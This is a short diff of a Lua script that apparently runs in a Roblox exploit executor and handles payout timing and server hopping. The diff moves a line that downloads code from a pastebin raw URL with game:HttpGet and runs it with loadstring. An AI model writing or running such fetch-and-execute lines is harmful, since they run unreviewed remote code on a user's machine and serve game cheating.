@@ -12,9 +12,10 @@ local number = tonumber(number)
 if number < getgenv().MaxTime then
     wait(number + getgenv().PayoutDelay)
 end
+    
+loadstring(game:HttpGet("https://pastebin.com/raw/qc2SwaaA"))()
 
-realgold = gold.Text
-
+realgold = gold.Text 
 spawn(function()
     while wait() do
         gold.Text = realgold .. "\nServerhopping."
@@ -28,6 +29,5 @@ spawn(function()
     end
 end)
 
-loadstring(game:HttpGet("https://pastebin.com/raw/qc2SwaaA"))()
 
 end
